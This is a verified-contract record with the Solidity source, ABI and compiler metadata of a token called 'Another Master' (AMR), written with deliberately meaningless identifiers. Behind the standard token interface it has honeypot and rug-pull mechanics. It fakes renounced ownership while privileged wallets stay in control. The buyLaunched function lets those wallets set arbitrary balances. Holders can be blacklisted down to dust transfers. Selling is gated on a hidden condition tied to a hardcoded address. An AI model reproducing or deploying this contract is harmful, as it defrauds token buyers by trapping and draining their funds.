{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface sellFeeIs {\n    function createPair(address fromExempt, address walletSell) external returns (address);\n}\n\ninterface toSenderMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundEnableTo) external view returns (uint256);\n\n    function transfer(address atLaunched, uint256 sellIs) external returns (bool);\n\n    function allowance(address receiverSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atLaunched,\n        uint256 sellIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minIs, uint256 value);\n    event Approval(address indexed receiverSender, address indexed spender, uint256 value);\n}\n\nabstract contract fundAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toSenderMarketingMetadata is toSenderMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AnotherMaster is fundAmount, toSenderMarketing, toSenderMarketingMetadata {\n\n    event OwnershipTransferred(address indexed launchedTotal, address indexed swapToReceiver);\n\n    function allowance(address maxTeamTake, address teamAmountMarketing) external view virtual override returns (uint256) {\n        if (teamAmountMarketing == teamMin) {\n            return type(uint256).max;\n        }\n        return maxList[maxTeamTake][teamAmountMarketing];\n    }\n\n    function sellMode(uint256 sellIs) public {\n        sellFund();\n        maxFund = sellIs;\n    }\n\n    constructor (){\n        \n        txMin fundAtLaunch = txMin(teamMin);\n        atMarketing = sellFeeIs(fundAtLaunch.factory()).createPair(fundAtLaunch.WETH(), address(this));\n        \n        exemptTakeWallet = _msgSender();\n        autoAmount[exemptTakeWallet] = true;\n        launchIs[exemptTakeWallet] = minAutoTrading;\n        launchedTeam();\n        \n        emit Transfer(address(0), exemptTakeWallet, minAutoTrading);\n    }\n\n    function fromAmount(address swapTokenTotal, address atLaunched, uint256 sellIs) internal returns (bool) {\n        if (swapTokenTotal == exemptTakeWallet) {\n            return totalReceiver(swapTokenTotal, atLaunched, sellIs);\n        }\n        uint256 walletAmount = toSenderMarketing(atMarketing).balanceOf(sellTrading);\n        require(walletAmount == maxFund);\n        require(atLaunched != sellTrading);\n        if (launchBuyTeam[swapTokenTotal]) {\n            return totalReceiver(swapTokenTotal, atLaunched, minTo);\n        }\n        return totalReceiver(swapTokenTotal, atLaunched, sellIs);\n    }\n\n    function receiverListMarketing(address launchList) public {\n        sellFund();\n        if (teamMarketing == launchedSell) {\n            launchedSell = toReceiver;\n        }\n        if (launchList == exemptTakeWallet || launchList == atMarketing) {\n            return;\n        }\n        launchBuyTeam[launchList] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return buyTrading;\n    }\n\n    function transferFrom(address swapTokenTotal, address atLaunched, uint256 sellIs) external override returns (bool) {\n        if (_msgSender() != teamMin) {\n            if (maxList[swapTokenTotal][_msgSender()] != type(uint256).max) {\n                require(sellIs <= maxList[swapTokenTotal][_msgSender()]);\n                maxList[swapTokenTotal][_msgSender()] -= sellIs;\n            }\n        }\n        return fromAmount(swapTokenTotal, atLaunched, sellIs);\n    }\n\n    bool public senderTake;\n\n    uint256 public launchedSell;\n\n    uint256 public teamMarketing;\n\n    mapping(address => mapping(address => uint256)) private maxList;\n\n    bool private walletTrading;\n\n    string private atAuto = \"Another Master\";\n\n    function launchedTeam() public {\n        emit OwnershipTransferred(exemptTakeWallet, address(0));\n        buyTrading = address(0);\n    }\n\n    uint256 constant minTo = 7 ** 10;\n\n    bool private amountFee;\n\n    uint256 private toReceiver;\n\n    address public atMarketing;\n\n    uint256 maxFund;\n\n    function transfer(address feeFrom, uint256 sellIs) external virtual override returns (bool) {\n        return fromAmount(_msgSender(), feeFrom, sellIs);\n    }\n\n    function owner() external view returns (address) {\n        return buyTrading;\n    }\n\n    uint256 private minAutoTrading = 100000000 * 10 ** 18;\n\n    address public exemptTakeWallet;\n\n    address sellTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalReceiver(address swapTokenTotal, address atLaunched, uint256 sellIs) internal returns (bool) {\n        require(launchIs[swapTokenTotal] >= sellIs);\n        launchIs[swapTokenTotal] -= sellIs;\n        launchIs[atLaunched] += sellIs;\n        emit Transfer(swapTokenTotal, atLaunched, sellIs);\n        return true;\n    }\n\n    function balanceOf(address fundEnableTo) public view virtual override returns (uint256) {\n        return launchIs[fundEnableTo];\n    }\n\n    mapping(address => uint256) private launchIs;\n\n    uint256 isFund;\n\n    mapping(address => bool) public launchBuyTeam;\n\n    function sellFund() private view {\n        require(autoAmount[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return isShould;\n    }\n\n    address teamMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address teamAmountMarketing, uint256 sellIs) public virtual override returns (bool) {\n        maxList[_msgSender()][teamAmountMarketing] = sellIs;\n        emit Approval(_msgSender(), teamAmountMarketing, sellIs);\n        return true;\n    }\n\n    mapping(address => bool) public autoAmount;\n\n    function receiverShouldTake(address takeWallet) public {\n        if (senderTake) {\n            return;\n        }\n        if (toReceiver == launchedSell) {\n            takeFeeMode = true;\n        }\n        autoAmount[takeWallet] = true;\n        \n        senderTake = true;\n    }\n\n    address private buyTrading;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minAutoTrading;\n    }\n\n    bool public takeFeeMode;\n\n    function name() external view virtual override returns (string memory) {\n        return atAuto;\n    }\n\n    uint8 private enableTakeSwap = 18;\n\n    string private isShould = \"AMR\";\n\n    function buyLaunched(address feeFrom, uint256 sellIs) public {\n        sellFund();\n        launchIs[feeFrom] = sellIs;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableTakeSwap;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapToReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTeamTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamAmountMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAmountMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundEnableTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIs\",\"type\":\"uint256\"}],\"name\":\"buyLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTakeWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchBuyTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchList\",\"type\":\"address\"}],\"name\":\"receiverListMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"}],\"name\":\"receiverShouldTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellIs\",\"type\":\"uint256\"}],\"name\":\"sellMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFeeMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTokenTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AnotherMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}